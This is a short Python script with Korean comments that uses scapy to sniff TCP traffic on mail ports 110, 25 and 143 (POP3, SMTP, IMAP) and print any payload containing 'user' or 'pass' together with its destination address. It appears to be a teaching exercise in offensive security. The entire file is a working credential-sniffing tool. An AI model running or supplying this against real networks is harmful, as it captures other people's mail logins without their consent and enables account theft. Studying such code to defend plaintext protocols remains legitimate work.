from scapy.all import sniff, TCP, IP

# 패킷 콜백 함수
def packet_callback(packet):
    if packet[TCP].payload:
        mypacket = str(packet[TCP].payload)
        if 'user' in mypacket.lower() or 'pass' in mypacket.lower():
            print(f"[*] Destination: {packet[IP].dst}")
            print(f"[*] {str(packet[TCP].payload)}")


def main():
    # 도청 기능 작동
    sniff(filter='tcp port 110 or tcp port 25 or tcp port 143',
          prn=packet_callback, store=0)


if __name__ == '__main__':
    main()
